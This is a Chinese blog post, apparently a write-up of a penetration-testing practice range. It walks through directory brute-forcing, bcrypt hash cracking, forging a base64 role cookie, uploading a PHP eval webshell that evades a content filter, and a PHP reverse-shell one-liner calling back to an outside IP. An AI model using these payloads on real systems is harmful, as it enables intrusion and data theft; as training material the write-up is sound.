@@ -1,0 +1,365 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>州弟学安全靶场 | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="开局一个ip http:&#x2F;&#x2F;111.119.241.115:10088&#x2F; 访问一下  我想着先扫扫端口，但是只扫出来了个22.但是他给定了10088这个，所以我感觉也爆不出来了  那我们就爆一下目录吧  爆出来个sql文件，用navicat解析一下 有个admins的表  12$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl&#x2F;K3KVx50krQSA1kT3xw1cc7JFF2$">
+<meta property="og:type" content="article">
+<meta property="og:title" content="州弟学安全靶场">
+<meta property="og:url" content="https://hundredsu.github.io/post/58cd1a0.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="开局一个ip http:&#x2F;&#x2F;111.119.241.115:10088&#x2F; 访问一下  我想着先扫扫端口，但是只扫出来了个22.但是他给定了10088这个，所以我感觉也爆不出来了  那我们就爆一下目录吧  爆出来个sql文件，用navicat解析一下 有个admins的表  12$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl&#x2F;K3KVx50krQSA1kT3xw1cc7JFF2$">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T13:21:43.000Z">
+<meta property="article:modified_time" content="2025-08-07T13:22:49.383Z">
+<meta property="article:author" content="Hundredsu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "州弟学安全靶场",
+  "url": "https://hundredsu.github.io/post/58cd1a0.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T13:21:43.000Z",
+  "dateModified": "2025-08-07T13:22:49.383Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/58cd1a0.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '州弟学安全靶场',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">州弟学安全靶场</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">州弟学安全靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T13:21:43.000Z" title="发表于 2025-08-07 21:21:43">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T13:22:49.383Z" title="更新于 2025-08-07 21:22:49">2025-08-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>开局一个ip</p>
+<p><a target="_blank" rel="noopener" href="http://111.119.241.115:10088/">http://111.119.241.115:10088/</a></p>
+<p>访问一下</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/1.png"></p>
+<p>我想着先扫扫端口，但是只扫出来了个22.但是他给定了10088这个，所以我感觉也爆不出来了</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/2.png"></p>
+<p>那我们就爆一下目录吧</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/3.png"></p>
+<p>爆出来个sql文件，用navicat解析一下</p>
+<p>有个admins的表</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/4.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$2y$<span class="number">10</span>$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2</span><br><span class="line">$2y$<span class="number">10</span>$bZdU0ipfQyWmOi1BW72GH.cGywpeawymx6.Z41g.PHZNGsav/KVq.</span><br></pre></td></tr></table></figure>
+
+
+
+<p>用php的password_hash()函数进行的加密的密码，不可逆，只能进行撞库了</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/5.png"></p>
+<p>没米</p>
+<p>那就john或者hashcat吧</p>
+<p>方法1</p>
+<p><a target="_blank" rel="noopener" href="https://www.tunnelsup.com/hash-analyzer/">https://www.tunnelsup.com/hash-analyzer/</a></p>
+<p>上面没查出来，但是看下面的格式盲猜就是bcrypt</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/6.png"></p>
+<p>再查一下**<font style="color:rgb(0, 0, 0);background-color:rgb(222, 231, 236);">Hash-Mode</font>**<font style="color:rgb(0, 0, 0);background-color:rgb(222, 231, 236);"></font></p>
+<p><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example%20hashes">https://hashcat.net/wiki/doku.php?id=example%20hashes</a></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/7.png"></p>
+<p>确定就是这个mode为3200</p>
+<p>用个佬推荐的字典吧</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a></p>
+<p>打开本地kali</p>
+<p>将密码存为txt</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/8.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">3200</span> ./<span class="number">1.</span>txt ./rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>但是我的电脑好像有点带不动就换一个吧</p>
+<p>方法2</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/9.png"></p>
+<p>秒出</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iloveryan</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用第一个账号登录成功</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/10.png"></p>
+<p>接下来没测出来其他洞，试试前面爆出来的30x的那些目录吧</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">07</span>] <span class="number">302</span> -    0B  - /admin.php  -&gt;  login.php</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">21</span>] <span class="number">302</span> -    0B  - /article.php  -&gt;  front_articles.php</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">21</span>] <span class="number">301</span> -  328B  - /assets  -&gt;  http:<span class="comment">//111.119.241.115:10088/assets/</span></span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">21</span>] <span class="number">403</span> -  300B  - /assets/</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">29</span>] <span class="number">403</span> -  304B  - /components/</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">29</span>] <span class="number">301</span> -  332B  - /components  -&gt;  http:<span class="comment">//111.119.241.115:10088/components/</span></span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">33</span>] <span class="number">200</span> -    5KB - /database.sql</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">47</span>] <span class="number">200</span> -  229B  - /install.php</span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">47</span>] <span class="number">200</span> -  229B  - /install.php?profile=<span class="keyword">default</span></span><br><span class="line">[<span class="number">00</span>:<span class="number">07</span>:<span class="number">52</span>] <span class="number">200</span> -  837B  - /login.php</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">17</span>] <span class="number">403</span> -  306B  - /server-status</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">17</span>] <span class="number">403</span> -  307B  - /server-status/</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">18</span>] <span class="number">302</span> -    0B  - /settings.php  -&gt;  login.php</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">32</span>] <span class="number">302</span> -    0B  - /upload.php  -&gt;  login.php</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">33</span>] <span class="number">403</span> -  301B  - /uploads/</span><br><span class="line">[<span class="number">00</span>:08:<span class="number">33</span>] <span class="number">301</span> -  329B  - /uploads  -&gt;  http:<span class="comment">//111.119.241.115:10088/uploads/</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>访问<a target="_blank" rel="noopener" href="http://111.119.241.115:10088//upload.php">http://111.119.241.115:10088//upload.php</a></p>
+<p>还是跳转到login</p>
+<p>那就是权限不够呗，但是此时admin的密码也爆不出来</p>
+<p>只能试试越权了</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/11.png"></p>
+<p>双等号 一眼丁真为base64</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/12.png"></p>
+<p>解码果然，那我们尝试改id为2 role为admin</p>
+<p>记得url编码</p>
+<p>替换访问成功，也可以bp里面自动改</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/13.png"></p>
+<p>越权成功</p>
+<p>随便乱传一个后缀（不要上来就传php，真实攻防有可能直接就引起注意了呢）</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/14.png"></p>
+<p>发现并不是白名单</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/15.png"></p>
+<p>也不是黑名单，以为稳了</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/16.png"></p>
+<p>文件上传发现内容检测</p>
+<p>一点点删，看是检验什么</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/17.png"></p>
+<p>发现检验</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先试试脏数据</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/18.png"></p>
+<p>好像不行</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/19.png"></p>
+<p>试试奇葩一点的写法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">常规写法：</span><br><span class="line">&lt;?php</span><br><span class="line">echo <span class="title function_">date</span><span class="params">(<span class="string">&#x27;Y-m-d h:m:s&#x27;</span>)</span></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">短标签，php5<span class="number">.4</span>起</span><br><span class="line">&lt;echo <span class="number">1</span>;?&gt;</span><br><span class="line"></span><br><span class="line">asp风格</span><br><span class="line">&lt;% echo <span class="number">1</span>;%&gt;</span><br><span class="line"></span><br><span class="line">长标签写法</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&#x27;pass&#x27;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>用下面这个传成功了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&#x27;pass&#x27;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/20.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/21.png"></p>
+<p>试了好久，看了一个博主才知道</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/22.png"></p>
+<p>md5</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ac44b8b3e0c3e42e499cedea340f49eb</span><br></pre></td></tr></table></figure>
+
+<p>20250409_ac44b8b3e0.php</p>
+<p>原本以为是这样，但是连不上</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.119.241.115:10088/20250409_ac44b8b3e0.php</span></span><br></pre></td></tr></table></figure>
+
+<p>幸好前面扫目录还发现了又uploads的目录</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/23.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//111.119.241.115:10088/uploads/20250409_ac44b8b3e0.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/24.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/25.png"></p>
+<p>linux</p>
+<p>怕别人的网站崩就不打内核了</p>
+<p>试试sudo和suid先吧</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/26.png"></p>
+<p>发现这些</p>
+<p>如果不知道哪些能提权的 可以扔给ai（从神农sec学的）</p>
+<p>但是这里很明显的</p>
+<p>&#x2F;bin&#x2F;bash 就是一个shell了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/27.png"></p>
+<p>但是要执行&#x2F;bin&#x2F;bash并返回结果，需要用交互式shell才能执行。而目前我们使用的哥斯拉提供的命令执行，只是一个单命令执行的模式，就是你执行一次命令，他返回一次结果，所以目前在哥斯拉中是执行不了&#x2F;bin&#x2F;bash的</p>
+<p>我们可以先用反弹shell获取一个交互式shell</p>
+<p>记得开放安全组</p>
+<p>需要公网vps</p>
+<p>此时我们也知道了该服务器有php的环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp <span class="number">8899</span>  </span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;47.113.229.136&quot;,8899);`/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<p>反弹shell命令忘了可以查一下</p>
+<p>这里我用哥斯拉弹没弹成功，试试冰蝎</p>
+<p>重新传,记得冰蝎有自己的马</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/28.png"></p>
+<p>直接哥斯拉传</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/29.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/30.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/31.png"></p>
+<p>用这个一直报错</p>
+<p>最后在神农sec里学到了一招</p>
+<p>伪交互shell</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/32.png"></p>
+<p><font style="color:rgb(52, 73, 94);">但是，可以利用哥斯拉的RealCmd开启伪交互式Shell：</font></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/33.png"></p>
+<p><font style="color:rgb(52, 73, 94);">然后，在本机使用netccat连接，即可获取伪交互式shell：</font></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/34.png"></p>
+<p>同理</p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/35.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/36.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/37.png"></p>
+<p><img src="/img/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA/38.png"></p>
+<p>拿下</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/58cd1a0.html">https://hundredsu.github.io/post/58cd1a0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/a36a147c.html" title="从小程序到web的一次测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">从小程序到web的一次测试</div></div><div class="info-2"><div class="info-item-1">简单描述通过未授权访问，获取弱口令泄露，解密获取管理员权限，接管多个web网站，可对用户进行增删改查，修改密码等操作，并可以删除其他管理员，同时泄露全校8万多人的身份证，学号，工号，手机号，邮箱，家庭住址等五要素信息 打开自己的视野，不要局限于小程序或者web端，有时候收集到后端登录框，也可以查一下看看是否有对应的小程序或者前端，收集思路是差不多的 先从小程序获取到了主域名，还可以绕cdn后用ip进行收集  信息收集：使用domain:”xxxxxxx.cn”搜索，获取了很多子域名 https://wxrkxxxx.xxxxxxx.cn/ https://bxs.xxxxxxx.cn/ http://plan.xxxxxxx.cn/ 漏洞复现打开小程序，抓包拦截 一个可以回退的登录框  然后点击  页面跳转，再点击我的  将这几个都点一遍，此时一直抓着包不放  直到抓到该包  POST &#x2F;database&#x2F;getArcticles HTTP&#x2F;1.1 Host: xxapi.xxxxxx.cn Content-Length: 10 Xweb_xhr:...</div></div></div></a><a class="pagination-related" href="/post/7c1aee27.html" title="恶劣环境下（docker）文件传输"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div 